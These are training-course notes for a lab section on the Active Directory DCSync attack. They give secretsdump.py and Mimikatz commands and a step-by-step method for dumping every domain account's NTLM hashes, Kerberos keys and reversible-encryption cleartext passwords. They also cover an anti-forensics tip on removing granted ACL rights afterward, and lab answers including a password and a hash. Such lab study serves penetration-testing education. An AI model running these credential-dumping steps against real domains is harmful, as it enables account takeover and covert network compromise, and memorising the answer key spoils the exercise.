## ID
530

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 22 — DCSync

## Description
Perform a DCSync attack using secretsdump.py and Mimikatz to extract all domain NTLM hashes, Kerberos keys, and cleartext passwords from accounts configured with reversible encryption.

## Tags
dcsync, active directory, secretsdump, mimikatz, ntds, credential dumping

## Commands
- secretsdump.py -outputfile <PREFIX> -just-dc <DOMAIN>/<USER>@<DC_IP>
- secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DC_IP>
- secretsdump.py -just-dc-user <TARGET_USER> <DOMAIN>/<USER>@<DC_IP>
- secretsdump.py -just-dc -pwd-last-set -history -user-status <DOMAIN>/<USER>@<DC_IP>
- Get-DomainUser -Identity <USER> | select samaccountname,objectsid,memberof,useraccountcontrol | fl
- Get-ObjectAcl "DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
- runas /netonly /user:<DOMAIN>\<USER> powershell
- mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<TARGET_USER>
- Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
- Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol

## What This Section Covers
DCSync abuses Active Directory's built-in Directory Replication Service protocol to impersonate a Domain Controller and request password data for any account in the domain. The attack requires an account with Replicating Directory Changes and Replicating Directory Changes All extended rights — permissions that Domain/Enterprise Admins hold by default but are sometimes granted to regular users. This section demonstrates the attack from both Linux (secretsdump.py) and Windows (Mimikatz), including extracting cleartext passwords from accounts with reversible encryption enabled.

## Methodology
1. Confirm the compromised user (adunn) has DCSync rights by checking their SID with `Get-DomainUser` and then querying the domain object's ACLs with `Get-ObjectAcl` filtering for `Replication-Get` ACE types.
2. **From Linux:** Run `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5` and enter adunn's password when prompted. This produces three output files: `.ntds` (NTLM hashes), `.ntds.kerberos` (Kerberos keys), `.ntds.cleartext` (cleartext from reversible-encryption accounts).
3. **From Windows:** Use `runas /netonly /user:INLANEFREIGHT\adunn powershell` to get a shell in adunn's context, then launch Mimikatz and run `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` to pull a specific user's hash.
4. Check for reversible-encryption accounts with `Get-ADUser -Filter 'userAccountControl -band 128'` or `Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}`.
5. Inspect the `.ntds.cleartext` file for any decrypted passwords.
6. Use `grep <USERNAME> inlanefreight_hashes.ntds` to extract a specific user's NTLM hash from the dump.

## Multi-step Workflow (optional)
```
# From MS01, SSH to Linux attack host
ssh htb-student@172.16.5.225

# Dump entire NTDS via DCSync
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Check for cleartext passwords (reversible encryption accounts)
cat inlanefreight_hashes.ntds.cleartext

# Grab a specific user's NTLM hash
grep khartsfield inlanefreight_hashes.ntds
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Another user with "Store password using reversible encryption" set | syncron | `cat inlanefreight_hashes.ntds.cleartext` — second entry beyond proxyagent |
| Q2: That user's cleartext password | Mycleart3xtP@ss! | Same `.cleartext` file, format is `user:CLEARTEXT:password` |
| Q3: NTLM hash for khartsfield | 4bb3b317845f0954200a6b0acc9b9f9a | `grep khartsfield inlanefreight_hashes.ntds` — NT hash is the fourth colon-delimited field |

## Key Takeaways
- DCSync does not require code execution on the DC itself — it works entirely over the network via the MS-DRSR replication protocol, making it stealthier than NTDS.dit theft via VSS.
- The two critical ACL rights are **Replicating Directory Changes** and **Replicating Directory Changes All**; always enumerate these during assessments because non-admin accounts sometimes hold them.
- Accounts with reversible encryption (`userAccountControl -band 128` / `ENCRYPTED_TEXT_PWD_ALLOWED`) store passwords as RC4-encrypted blobs recoverable with the Syskey — secretsdump.py decrypts these automatically and outputs them in the `.cleartext` file.
- The `-just-dc-ntlm` flag is useful for a cleaner dump when you only need NTLM hashes, while `-pwd-last-set`, `-history`, and `-user-status` provide enriched data for client reporting (password age, reuse, disabled accounts).
- If you have WriteDacl over the domain object, you can temporarily grant DCSync rights to any user you control, perform the attack, then remove the ACL to reduce forensic footprint.
- Mimikatz requires you to run in the context of the privileged user (`runas /netonly`), whereas secretsdump.py just takes the credentials inline.

## Gotchas (optional)
- Mimikatz targets one user at a time (`/user:` flag), while secretsdump.py dumps everything by default — choose the tool based on whether you need surgical or bulk extraction.
- `runas /netonly` creates a logon session that only uses the supplied credentials for network authentication — local file access still runs as your current user, which can be confusing.
- The cleartext file will be empty if no accounts have reversible encryption set — don't assume the dump failed.
- secretsdump.py uses `smbexec` by default for remote execution on the DC, which creates a temporary service and may trigger alerts; keep this in mind for OPSEC.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[21-acl-abuse-tactics]] | [[23-privileged-access]] →
<!-- AUTO-LINKS-END -->
